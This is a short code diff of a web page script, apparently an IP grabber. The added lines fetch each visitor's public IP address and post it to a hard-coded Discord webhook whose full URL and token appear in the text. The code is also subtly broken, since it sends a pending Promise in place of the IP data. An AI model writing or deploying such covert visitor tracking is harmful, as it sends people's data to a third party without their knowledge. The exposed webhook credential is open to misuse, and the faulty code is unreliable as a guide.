@@ -9,17 +9,21 @@
   <script>
     const ipurl = "https://api.ipify.org?format=json";
 
+        const ipgot = fetch(ipurl)
+        .then(response => response.json())
+        .then(data => console.log(data));
+    
     const whurl =
       "https://discord.com/api/webhooks/845950238719213608/OlWrovNwzQIgXHqGL1zlw5AyeMUg5M_QtCfXNqs7zDI1zlIv1gml_aET2InT6iBXyuaf";
     const msg = {
-      content: "Hello! I'm a bot, this is fetch api"
+      content: ipgot
     };
+    
+    
     fetch(whurl, {
       method: "POST",
       headers: { "content-type": "application/json" },
-      const response = fetch(ipurl)
-        .then(response => response.json())
-        .then(data => body: JSON.stringify(msg));
+      body: JSON.stringify(msg)
     });
 
     window.addEventListener("load", function() {
